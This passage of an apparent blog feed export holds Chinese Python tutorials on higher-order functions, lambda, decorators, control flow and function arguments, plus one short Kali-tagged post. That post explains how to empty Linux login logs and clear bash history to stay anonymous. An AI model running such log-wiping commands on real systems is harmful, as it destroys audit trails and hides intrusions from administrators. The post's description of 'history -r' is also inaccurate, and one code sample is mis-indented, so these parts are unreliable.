class="line">list(filter(not_empty, [&apos;A&apos;, &apos;&apos;, &apos;B&apos;, None, &apos;C&apos;, &apos;  &apos;]))</span><br><span class="line"># 结果: [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]</span><br></pre></td></tr></table></figure><p>可见用<code>filter()</code>这个高阶函数，关键在于正确实现一个“筛选”函数。</p><p>注意到<code>filter()</code>函数返回的是一个<code>Iterator</code>，也就是一个惰性序列，所以要强迫<code>filter()</code>完成计算结果，需要用<code>list()</code>函数获得所有结果并返回list。</p><h4 id="排序算法-sorted"><a href="#排序算法-sorted" class="headerlink" title="排序算法  sorted"></a>排序算法  sorted</h4><p>Python内置的<code>sorted()</code>函数就可以对list进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([36, 5, -12, 9, -21])</span><br><span class="line">[-21, -12, 5, 9, 36]</span><br></pre></td></tr></table></figure><p>此外，<code>sorted()</code>函数也是一个高阶函数，它还可以接收一个<code>key</code>函数来实现自定义的排序，例如按绝对值大小排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key=abs)</span><br><span class="line">[5, 9, -12, -21, 36]</span><br></pre></td></tr></table></figure><p>key指定的函数将作用于list的每一个元素上，并根据key函数返回的结果进行排序。</p><p>我们再看一个字符串排序的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;])</span><br><span class="line">[&apos;Credit&apos;, &apos;Zoo&apos;, &apos;about&apos;, &apos;bob&apos;]</span><br></pre></td></tr></table></figure><p>默认情况下，对字符串排序，是按照ASCII的大小比较的，由于<code>&#39;Z&#39; &lt; &#39;a&#39;</code>，结果，大写字母<code>Z</code>会排在小写字母<code>a</code>的前面。</p><p>现在，我们提出排序应该忽略大小写，按照字母序排序。要实现这个算法，不必对现有代码大加改动，只要我们能用一个key函数把字符串映射为忽略大小写排序即可。忽略大小写来比较两个字符串，实际上就是先把字符串都变成大写（或者都变成小写），再比较。</p><p>这样，我们给<code>sorted</code>传入key函数，即可实现忽略大小写的排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;], key=str.lower)</span><br><span class="line">[&apos;about&apos;, &apos;bob&apos;, &apos;Credit&apos;, &apos;Zoo&apos;]</span><br></pre></td></tr></table></figure><p>要进行反向排序，不必改动key函数，可以传入第三个参数<code>reverse=True</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;], key=str.lower, reverse=True)</span><br><span class="line">[&apos;Zoo&apos;, &apos;Credit&apos;, &apos;bob&apos;, &apos;about&apos;]</span><br></pre></td></tr></table></figure><p>从上述例子可以看出，高阶函数的抽象能力是非常强大的，而且，核心代码可以保持得非常简洁。</p><p><strong>总结</strong> </p><p><code>sorted()</code>也是一个高阶函数。用<code>sorted()</code>排序的关键在于实现一个映射函数。</p><h4 id="匿名函数-lambda"><a href="#匿名函数-lambda" class="headerlink" title="匿名函数  lambda"></a>匿名函数  lambda</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure><p>通过对比可以看出，匿名函数<code>lambda x: x * x</code>实际上就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br></pre></td></tr></table></figure><p>关键字lambda 表示匿名函数，冒号前面的x表示函数参数。</p><p>匿名函数有限制:  就是只能有一个表达式,不用写return, 返回值就是该表达式的结果。</p><p>匿名函数有个好处，因为函数没有名字， 所以不必担心函数起冲突， 此外，匿名函数也是一个函数对象， 也可以将匿名函数赋值给一个变量， 在利用变量调用该函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = lambda x: x * x</span><br><span class="line">&gt;&gt;&gt; f</span><br><span class="line">&lt;function &lt;lambda&gt; at 0x101c6ef28&gt;</span><br><span class="line">&gt;&gt;&gt; f(5)</span><br><span class="line">25</span><br></pre></td></tr></table></figure><h4 id="装饰器-log"><a href="#装饰器-log" class="headerlink" title="装饰器  @log"></a>装饰器  @log</h4><p>由于函数也是一个对象，而且函数对象可以被赋值给变量，所以，通过变量也能调用该函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def now():</span><br><span class="line">...     print(&apos;2015-3-25&apos;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; f = now</span><br><span class="line">&gt;&gt;&gt; f()</span><br><span class="line">2015-3-25</span><br></pre></td></tr></table></figure><p>函数对象有一个<code>__name__</code>属性，可以拿到函数的名字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; now.__name__</span><br><span class="line">&apos;now&apos;</span><br><span class="line">&gt;&gt;&gt; f.__name__</span><br><span class="line">&apos;now&apos;</span><br></pre></td></tr></table></figure><p>现在，假设我们要增强<code>now()</code>函数的功能，比如，<strong>在函数调用前后自动打印日志，但又不希望修改<code>now()</code>函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。</strong> </p><p>本质上，decorator就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的decorator，可以定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def log(func):</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        print(&apos;call %s():&apos; % func.__name__)</span><br><span class="line">        return func(*args, **kw)   ## 传递func  发生调用函数</span><br><span class="line">    return wrapper  ## 调用warpper, 是指生效。</span><br></pre></td></tr></table></figure><p>观察上面的<code>log</code>，因为它是一个decorator，所以接受一个函数作为参数，并返回一个函数。我们要借助Python的@语法，把decorator置于函数的定义处：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log</span><br><span class="line">def now():</span><br><span class="line">    print(&apos;2015-3-25&apos;)</span><br></pre></td></tr></table></figure><p>调用<code>now()</code>函数，不仅会运行<code>now()</code>函数本身，还会在运行<code>now()</code>函数前打印一行日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; now()</span><br><span class="line">call now():</span><br><span class="line">2015-3-25</span><br></pre></td></tr></table></figure><p>把<code>@log</code>放到<code>now()</code>函数的定义处，相当于执行了语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">now = log(now)</span><br></pre></td></tr></table></figure><p>由于<code>log()</code>是一个decorator，返回一个函数，所以，原来的<code>now()</code>函数仍然存在，只是现在同名的<code>now</code>变量指向了新的函数，于是调用<code>now()</code>将执行新函数，即在<code>log()</code>函数中返回的<code>wrapper()</code>函数。</p><p><code>wrapper()</code>函数的参数定义是<code>(*args, **kw)</code>，因此，<code>wrapper()</code>函数可以接受任意参数的调用。在<code>wrapper()</code>函数内，首先打印日志，再紧接着调用原始函数。</p><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014318435599930270c0381a3b44db991cd6d858064ac0000" target="_blank" rel="noopener">廖雪峰-装饰器</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>清除Linux登陆信息以及Bash历史</title>
      <link href="/2018/01/12/kali/%E6%B8%85%E9%99%A4Linux%E7%99%BB%E9%99%86%E4%BF%A1%E6%81%AF%E4%BB%A5%E5%8F%8ABash%E5%8E%86%E5%8F%B2/"/>
      <url>/2018/01/12/kali/%E6%B8%85%E9%99%A4Linux%E7%99%BB%E9%99%86%E4%BF%A1%E6%81%AF%E4%BB%A5%E5%8F%8ABash%E5%8E%86%E5%8F%B2/</url>
      
        <content type="html"><![CDATA[<ul><li>用户登陆信息<ul><li>last</li><li>lastb</li><li>lastlog</li></ul></li><li>history   </li></ul><a id="more"></a><p><br></p><h3 id="清除登陆信息"><a href="#清除登陆信息" class="headerlink" title="清除登陆信息"></a>清除登陆信息</h3><p>Linux 系统有三个标准的显示用户最近登陆信息的命令: <code>last</code>, <code>lastb</code>, <code>lastlog</code></p><p>这些命令的输出信息包括登录用户名，最近登陆时间，IP地址等。</p><p>为了更好的保持匿名，可以清除信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">last  命令      对应日志文件 /var/log/wtmp:       成功登陆用户</span><br><span class="line">lastb 命令      对应日志文件 /var/log/btmp:       尝试登陆用户</span><br><span class="line">lastlog 命令    对应日志文件 /var/log/lastlog:    最近登陆信息</span><br></pre></td></tr></table></figure><p>清空日志文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br></pre></td></tr></table></figure><p><br></p><h3 id="清除Bash历史"><a href="#清除Bash历史" class="headerlink" title="清除Bash历史"></a>清除Bash历史</h3><p>可以在执行命令时，指定Bash不保存命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &lt;空格&gt; command</span><br></pre></td></tr></table></figure><p>在要执行的命令前加一个空格。</p><p>清除当前登录session的历史:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ history -r</span><br></pre></td></tr></table></figure><p>清除所有历史:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ history -cw</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-控制语句及函数</title>
      <link href="/2018/01/10/gram/Python-%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/"/>
      <url>/2018/01/10/gram/Python-%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>if-elif-else</li><li>for</li><li>while</li><li>函数<ul><li>函数定义</li><li>空函数 pass</li><li>返回多个值</li><li>可变参数 *</li><li>关键字参数 **</li></ul></li></ul><a id="more"></a><p><br></p><h3 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h3><h4 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if - elif - else"></a>if - elif - else</h4><p>比如，输入用户年龄，根据年龄打印不同的内容，在Python程序中，用<code>if</code>语句实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&apos;your age is&apos;, age)</span><br><span class="line">    print(&apos;adult&apos;)</span><br></pre></td></tr></table></figure><p>根据Python的缩进规则，如果<code>if</code>语句判断是<code>True</code>，就把缩进的两行print语句执行了，否则，什么也不做。</p><p>也可以给<code>if</code>添加一个<code>else</code>语句，意思是，如果<code>if</code>判断是<code>False</code>，不要执行<code>if</code>的内容，去把<code>else</code>执行了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 3</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&apos;your age is&apos;, age)</span><br><span class="line">    print(&apos;adult&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;your age is&apos;, age)</span><br><span class="line">    print(&apos;teenager&apos;)</span><br></pre></td></tr></table></figure><p>注意不要少写了冒号<code>:</code>。</p><p>当然上面的判断是很粗略的，完全可以用<code>elif</code>做更细致的判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 3</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&apos;adult&apos;)</span><br><span class="line">elif age &gt;= 6:</span><br><span class="line">    print(&apos;teenager&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;kid&apos;)</span><br></pre></td></tr></table></figure><p><code>elif</code>是<code>else if</code>的缩写，完全可以有多个<code>elif</code>，所以<code>if</code>语句的完整形式就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件判断1&gt;:</span><br><span class="line">    &lt;执行1&gt;</span><br><span class="line">elif &lt;条件判断2&gt;:</span><br><span class="line">    &lt;执行2&gt;</span><br><span class="line">elif &lt;条件判断3&gt;:</span><br><span class="line">    &lt;执行3&gt;</span><br><span class="line">else:</span><br><span class="line">    &lt;执行4&gt;</span><br></pre></td></tr></table></figure><p><code>if</code>语句执行有个特点，它是从上往下判断，如果在某个判断上是<code>True</code>，把该判断对应的语句执行后，就忽略掉剩下的<code>elif</code>和<code>else</code>，所以，请测试并解释为什么下面的程序打印的是<code>teenager</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">if age &gt;= 6:</span><br><span class="line">    print(&apos;teenager&apos;)</span><br><span class="line">elif age &gt;= 18:</span><br><span class="line">    print(&apos;adult&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;kid&apos;)</span><br></pre></td></tr></table></figure><p><code>if</code>判断条件还可以简写，比如写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if x:</span><br><span class="line">    print(&apos;True&apos;)</span><br></pre></td></tr></table></figure><p>只要<code>x</code>是非零数值、非空字符串、非空list等，就判断为<code>True</code>，否则为<code>False</code>。</p><p><br></p><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>Python的循环有两种，<strong>一种是for…in循环，依次把list或tuple中的每个元素迭代出来，</strong> 看例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">for name in names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure><p>执行这段代码，会依次打印<code>names</code>的每一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Michael</span><br><span class="line">Bob</span><br><span class="line">Tracy</span><br></pre></td></tr></table></figure><p>所以<code>for x in ...</code>循环就是把每个元素代入变量<code>x</code>，然后执行缩进块的语句。</p><p><strong>第二种循环是while循环，只要条件满足，就不断循环，条件不满足时退出循环。</strong> 比如我们要计算100以内所有奇数之和，可以用while循环实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum = 0</span><br><span class="line">n = 99</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    sum = sum + n</span><br><span class="line">    n = n - 2</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><p>在循环内部变量<code>n</code>不断自减，直到变为<code>-1</code>时，不再满足while条件，循环退出。</p><p><br></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><p>在Python中，定义一个函数要使用<code>def</code>语句，依次写出函数名、括号、括号中的参数和冒号<code>:</code>，然后，在缩进块中编写函数体，函数的返回值用<code>return</code>语句返回。</p><h4 id="空函数-pass"><a href="#空函数-pass" class="headerlink" title="空函数  pass"></a>空函数  pass</h4><p>如果想定义一个什么事也不做的空函数，可以用<code>pass</code>语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def nop():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p><code>pass</code>语句什么都不做，那有什么用？实际上<code>pass</code>可以用来作为占位符，比如现在还没想好怎么写函数的代码，就可以先放一个<code>pass</code>，让代码能运行起来。</p><p><code>pass</code>还可以用在其他语句里，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if age &gt;= 18:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>缺少了<code>pass</code>，代码运行就会有语法错误。</p><h4 id="返回多个值"><a href="#返回多个值" class="headerlink" title="返回多个值"></a>返回多个值</h4><p>函数可以返回多个值吗？答案是肯定的。</p><p>比如在游戏中经常需要从一个点移动到另一个点，给出坐标、位移和角度，就可以计算出新的新的坐标：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">def move(x, y, step, angle=0):</span><br><span class="line">    nx = x + step * math.cos(angle)</span><br><span class="line">    ny = y - step * math.sin(angle)</span><br><span class="line">    return nx, ny</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; x, y = move(100, 100, 60, math.pi / 6)</span><br><span class="line">&gt;&gt;&gt; print(x, y)</span><br><span class="line">151.96152422706632 70.0</span><br></pre></td></tr></table></figure><p>但其实这只是一种假象，Python函数返回的仍然是单一值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = move(100, 100, 60, math.pi / 6)</span><br><span class="line">&gt;&gt;&gt; print(r)</span><br><span class="line">(151.96152422706632, 70.0)</span><br></pre></td></tr></table></figure><p>原来返回值是一个tuple！但是，在语法上，返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple，按位置赋给对应的值，所以，Python的函数返回多值其实就是返回一个tuple，但写起来更方便。</p><p><br></p><h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def power(x, n=2):</span><br><span class="line">    s = 1</span><br><span class="line">    while n &gt; 0:</span><br><span class="line">        n = n - 1</span><br><span class="line">        s = s * x</span><br><span class="line">    return s</span><br></pre></td></tr></table></figure><p>则，我们调用power(5),  相当于调用 power(5, 2)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; power(5)</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; power(5, 2)</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>设置默认参数时，有几点要注意：</p><ul><li><p>一是必选参数在前，默认参数在后，否则Python的解释器会报错（思考一下为什么默认参数不能放在必选参数前面）</p></li><li><p>二是如何设置默认参数。</p><p>当函数有多个参数时，把变化大的参数放前面，变化小的参数放后面。变化小的参数就可以作为默认参数。</p><p>​</p></li></ul><p><br></p><h4 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数  *"></a>可变参数  *</h4><p>要定义出这个函数，我们必须确定输入的参数。由于参数个数不确定，我们首先想到可以把a，b，c……作为一个list或tuple传进来，这样，函数可以定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def calc(numbers):</span><br><span class="line">    sum = 0</span><br><span class="line">    for n in numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    return sum</span><br></pre></td></tr></table></figure><p>但是调用的时候，需要先组装出一个list或tuple：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; calc([1, 2, 3])</span><br><span class="line">14</span><br><span class="line">&gt;&gt;&gt; calc((1, 3, 5, 7))</span><br><span class="line">84</span><br></pre></td></tr></table></figure><p>如果利用可变参数，调用函数的方式可以简化成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; calc(1, 2, 3)</span><br><span class="line">14</span><br><span class="line">&gt;&gt;&gt; calc(1, 3, 5, 7)   // 区别少了 []  ()</span><br><span class="line">84</span><br></pre></td></tr></table></figure><p>所以，我们把函数的参数改为可变参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def calc(*numbers):   // 函数定义修改为  *numbers</span><br><span class="line">    sum = 0</span><br><span class="line">    for n in numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    return sum</span><br></pre></td></tr></table></figure><p>定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个<code>*</code>号。在函数内部，参数<code>numbers</code>接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; calc(1, 2)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; calc()</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>如果已经有一个list或者tuple，要调用一个可变参数怎么办？可以这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; calc(nums[0], nums[1], nums[2])</span><br><span class="line">14</span><br></pre></td></tr></table></figure><p>这种写法当然是可行的，问题是太繁琐，所以Python允许你在list或tuple前面加一个<code>*</code>号，把list或tuple的元素变成可变参数传进去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; nums = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; calc(*nums)</span><br><span class="line">14</span><br></pre></td></tr></table></figure><p><code>*nums</code>表示把<code>nums</code>这个list的所有元素作为可变参数传进去。这种写法相当有用，而且很常见。</p><p><br></p><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数 **"></a>关键字参数 **</h4><p>可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple。而关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。请看示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, **kw):</span><br><span class="line">    print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw)</span><br></pre></td></tr></table></figure><p>函数<code>person</code>除了必选参数<code>name</code>和<code>age</code>外，还接受关键字参数<code>kw</code>。在调用该函数时，可以只传入必选参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; person(&apos;Michael&apos;, 30)</span><br><span class="line">name: Michael age: 30 other: &#123;&#125;</span><br></pre></td></tr></table></figure><p>也可以传入任意个数的关键字参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; person(&apos;Bob&apos;, 35, city=&apos;Beijing&apos;)</span><br><span class="line">name: Bob age: 35 other: &#123;&apos;city&apos;: &apos;Beijing&apos;&#125;</span><br><span class="line">&gt;&gt;&gt; person(&apos;Adam&apos;, 45, gender=&apos;M&apos;, job=&apos;Engineer&apos;)</span><br><span class="line">name: Adam age: 45 other: &#123;&apos;gender&apos;: &apos;M&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br></pre></td></tr></table></figure><p>应用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def test(name, age, **kw):</span><br><span class="line">    print(&quot;name : &quot; , name, &quot;  age = &quot;, age ,&quot; other &quot;,  kw)</span><br><span class="line">    for k in  kw:</span><br><span class="line">        #print(k, &quot; = &quot;, kw[k])  </span><br><span class="line">    </span><br><span class="line">if k == &apos;addr&apos;:</span><br><span class="line">            print(&quot;addr = &quot;, kw[k])</span><br><span class="line">        elif k == &apos;phone&apos;:</span><br><span class="line">            print(&quot;phone = &quot;, kw[k])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    test(&apos;lg&apos;, 12, addr=&apos;jn&apos;, phone=&apos;110&apos;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;phone  = 110</span><br><span class="line">&gt;&gt;addr  =  jn</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, **kw):</span><br><span class="line">    if &apos;city&apos; in kw:</span><br><span class="line">        # 有city参数</span><br><span class="line">        pass</span><br><span class="line">    if &apos;job&apos; in kw:</span><br><span class="line">        # 有job参数</span><br><span class="line">        pass</span><br><span class="line">    print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pyhton-数据类型</title>
      <link href="/2018/01/09/gram/Pyhton-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2018/01/09/gram/Pyhton-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
